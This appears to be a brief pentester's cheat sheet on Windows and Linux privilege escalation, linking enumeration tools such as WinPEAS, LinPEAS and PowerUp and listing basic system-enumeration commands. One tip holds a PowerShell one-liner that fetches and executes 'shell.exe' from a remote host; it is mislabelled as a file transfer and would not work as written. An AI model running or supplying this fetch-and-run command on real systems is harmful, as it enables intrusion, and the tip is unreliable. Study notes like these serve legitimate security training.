# Windows Privilege Escalations
## Important tips

- Use powershell for file transfers

``` iex(iwr http://10.10.10.100/shell.exe) ```
- Tools [Winpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) and [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) are more than enough

## Basic Enum
Command | Result 
------------|-----------
systeminfo  |   Get system information ; is system x64/x86 ; are any patches applied

# Linux Privilege Escalations

## Important tips
- [Linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) is the best tool which is more than enough

## Basic Enum
Command | Result 
------------ | -------------
whoami ; id ; uname -a | Get username and OS info



